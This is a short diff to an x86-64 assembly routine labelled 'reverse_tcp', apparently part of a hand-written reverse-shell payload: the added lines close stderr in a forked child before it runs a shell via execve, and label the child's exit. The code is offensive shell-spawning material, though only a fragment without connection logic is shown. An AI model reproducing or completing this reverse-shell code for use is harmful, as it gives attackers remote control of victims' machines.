@@ -24,6 +24,9 @@ reverse_tcp:
     jg      .parent_process
 
     ; ====== CHILD ====== ;
+    mov     rax, 3
+    mov     rdi, 2  ; close(STDERR);
+    syscall
 
     mov     rax, 59
     lea     rdi, [rel shell]
@@ -31,6 +34,7 @@ reverse_tcp:
     mov     rdx, 0
     syscall
 
+    ; ====== Exit child ====== ;
     mov     rax, 60
     mov     rdi, 1
     syscall
